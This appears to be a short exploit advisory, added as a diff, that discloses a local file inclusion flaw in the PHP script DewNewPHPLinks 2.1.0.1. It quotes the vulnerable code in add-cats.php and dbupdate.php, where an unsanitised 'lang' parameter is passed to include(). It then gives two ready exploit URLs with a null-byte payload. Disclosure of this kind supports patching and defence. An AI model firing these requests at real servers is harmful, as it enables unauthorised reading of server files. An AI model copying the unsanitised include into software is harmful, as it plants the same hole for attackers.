@@ -1,0 +1,27 @@
+#########################local file include#################
+Author: ItSecTeam
+
+download from:http://www.dew-code.com/components/com_jooget/file/dew-newphplinks.v.2.1.0.1b.sef.zip
+
+script:DewNewPHPLinks 2.1.0.1
+
+*********************lfi*******************
+vul1:/path/docs/add-cats.php
+$lang=$_GET['lang'];
+if($lang!='')
+include ("../include/lang/$lang.php");
+----------
+vul2:/path/docs/dbupdate.php
+$lang=$_GET['lang'];
+if($lang!='')
+include ("../include/lang/$lang.php");
+
+--------------------------------------------
+
+xpl lfi:/path/docs/add-cats.php?lang=[lfi]%00
+xpl lfi:/path/docs/dbupdate.php?lang=[lfi]%00
+########################
+
+discovered by ahmadbady
+
+########################
